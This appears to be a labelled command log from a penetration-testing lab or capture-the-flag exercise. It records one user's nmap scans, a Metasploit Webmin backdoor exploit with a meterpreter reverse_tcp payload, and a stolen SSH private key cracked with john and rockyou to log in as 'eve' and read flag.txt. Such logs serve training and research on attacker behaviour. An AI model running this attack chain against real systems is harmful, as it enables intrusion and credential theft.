User 92 start time 1594804777 end 1594807057
PADDING
PADDING
PADDING
INPUT|92--0|A0 A1 |1594804777|92|nmap 172.181.1.5 -p-|OUTPUT
INPUT|92--1|A0 A1 |1594804784|92|nmap 172.181.1.5 -p- -Pn|OUTPUT
INPUT|92--2|M0 |1594804792|92|nmap 172.18.1.5 -p-|OUTPUT
INPUT|92--3|M0 |1594804821|92|nmap 172.18.1.5 -p- -A|OUTPUT
INPUT|92--4|M2 |1594804954|92|msfconsole|OUTPUT
INPUT|92--5|M3 |1594804981|92|search webmin|OUTPUT
INPUT|92--6|M8 |1594805030|92|use exploit/unix/webapp/webmin_backdoor|OUTPUT
INPUT|92--7|M5 |1594805032|92|show options|OUTPUT
INPUT|92--8|U|1594805040|92|ip a|OUTPUT
INPUT|92--9|M6 |1594805056|92|set LHOST 10.1.135.83|OUTPUT
INPUT|92--10|M5 |1594805059|92|show options|OUTPUT
INPUT|92--11|M6 |1594805074|92|set RHOSTS 172.18.1.5|OUTPUT
INPUT|92--12|M8 |1594805118|92|exploit|OUTPUT
INPUT|92--13|A3 |1594805122|92|search web|OUTPUT
INPUT|92--14|A3 |1594805126|92|search web_de|OUTPUT
INPUT|92--15|M6 |1594805134|92|setg LHOST 10.1.135.83|OUTPUT
INPUT|92--16|M8 |1594805140|92|use exploit/multi/script/web_delivery|OUTPUT
INPUT|92--17|A5 |1594805143|92|show optins|OUTPUT
INPUT|92--18|A5 |1594805147|92|show otions|OUTPUT
INPUT|92--19|M5 |1594805152|92|show options|OUTPUT
INPUT|92--20|A6 |1594805160|92|set target linux|OUTPUT
INPUT|92--21|M5 |1594805162|92|show options|OUTPUT
INPUT|92--22|A5 |1594805169|92|show targets|OUTPUT
INPUT|92--23|A6 |1594805171|92|set target |OUTPUT
INPUT|92--24|M5 |1594805189|92|show options|OUTPUT
INPUT|92--25|A5 |1594805193|92|show targets|OUTPUT
INPUT|92--26|A6 |1594805197|92|set target |OUTPUT
INPUT|92--27|A6 |1594805199|92|set target 6|OUTPUT
INPUT|92--28|M5 |1594805203|92|show options|OUTPUT
INPUT|92--29|A6 |1594805227|92|set payload linux/x64/meterpreter/reverse_tcp |OUTPUT
INPUT|92--30|M5 |1594805229|92|show options|OUTPUT
INPUT|92--31|M8 |1594805232|92|run|OUTPUT
INPUT|92--32|M8 |1594805248|92|use exploit/unix/webapp/webmin_backdoor|OUTPUT
INPUT|92--33|M8 |1594805248|92|run|OUTPUT
INPUT|92--34|A6 |1594805258|92|set LPORT 4445|OUTPUT
INPUT|92--35|M8 |1594805271|92|run|OUTPUT
INPUT|92--36|M0 |1594805349|92|nmap 172.18.1.5/12 -p-|OUTPUT
INPUT|92--37|U|1594805408|92|sessions 3|OUTPUT
INPUT|92--38|U|1594805409|92|sessions|OUTPUT
INPUT|92--39|U|1594805412|92|sessions -u ~|OUTPUT
INPUT|92--40|U|1594805430|92|sessions -u 3|OUTPUT
INPUT|92--41|U|1594805454|92|sessions 3|OUTPUT
INPUT|92--42|M0 |1594805788|92|nmap 172.18.1.5/24 -p-|OUTPUT
INPUT|92--43|U|1594805875|92|sessions 4|OUTPUT
INPUT|92--44|U|1594805876|92|sessions|OUTPUT
INPUT|92--45|A0 A1 |1594806111|92|nmap 172.18.1.2|OUTPUT
INPUT|92--46|U|1594806190|92|ip a|OUTPUT
INPUT|92--47|U|1594806197|92|ip route|OUTPUT
INPUT|92--48|U|1594806397|92|sessions 3|OUTPUT
INPUT|92--49|U|1594806446|92|sessions 4|OUTPUT
INPUT|92--50|U|1594806448|92|sessions|OUTPUT
INPUT|92--51|A0 A1 |1594806564|92|nmap 81.2.195.254|OUTPUT
INPUT|92--52|U|1594806606|92|curl 81.2.195.254|OUTPUT
INPUT|92--53|U|1594806641|92|ping 10.1.18.22|OUTPUT
INPUT|92--54|A0 A1 |1594806645|92|nmap 10.1.18.22|OUTPUT
INPUT|92--55|A0 A1 |1594806668|92|nmap 10.1.17.4|OUTPUT
INPUT|92--56|A16 |1594806754|92|cd .ssh|OUTPUT
INPUT|92--57|A10 |1594806755|92|ls|OUTPUT
INPUT|92--58|M12 |1594806759|92|cat id_rsa|OUTPUT
INPUT|92--59|A14 |1594806766|92|john id_rsa|OUTPUT
INPUT|92--60|A14 A16 |1594806791|92|ssh2john|OUTPUT
INPUT|92--61|A1 A9 A10 A11 A12 A14 A16 A17 |1594806794|92|locate ssh2john|OUTPUT
INPUT|92--62|U|1594806798|92|cd|OUTPUT
INPUT|92--63|M13 |1594806800|92|python ssh2john.py|OUTPUT
INPUT|92--64|M13 |1594806804|92|python ssh2john.py .ssh/id_rsa|OUTPUT
INPUT|92--65|M13 |1594806816|92|python ssh2john.py .ssh/id_rsa > eve|OUTPUT
INPUT|92--66|A14 |1594806820|92|john eve|OUTPUT
INPUT|92--67|A1 A9 A10 A11 A12 A17 |1594806833|92|locate rockyou|OUTPUT
INPUT|92--68|M14 |1594806848|92|john eve --wordlist=/usr/share/wordlists/rockyou.txt|OUTPUT
INPUT|92--69|A10 |1594806887|92|ls|OUTPUT
INPUT|92--70|M16 |1594806912|92|ssh eve@10.1.17.4|OUTPUT
INPUT|92--71|M15 |1594806924|92|chmod 600 .ssh/id_rsa|OUTPUT
INPUT|92--72|M16 |1594806925|92|ssh eve@10.1.17.4|OUTPUT
INPUT|92--73|A10 |1594806989|92|ls -la|OUTPUT
INPUT|92--74|U|1594806991|92|cd top-secret/|OUTPUT
INPUT|92--75|A10 |1594806992|92|ls|OUTPUT
INPUT|92--76|M17 |1594806993|92|cat flag.txt|OUTPUT
INPUT|92--77|U|1594807057|92|sessions 5|OUTPUT
